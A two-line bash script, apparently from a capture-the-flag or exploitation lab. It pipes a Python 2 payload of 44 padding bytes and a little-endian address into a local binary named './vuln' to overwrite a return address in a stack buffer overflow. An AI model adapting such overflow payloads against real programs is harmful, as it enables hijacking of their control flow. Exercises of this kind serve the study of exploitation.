#!/bin/bash

## USE PYTHON2
python2 -c "print('A'*44 + '\xcb\x85\x04\x08')" | ./vuln
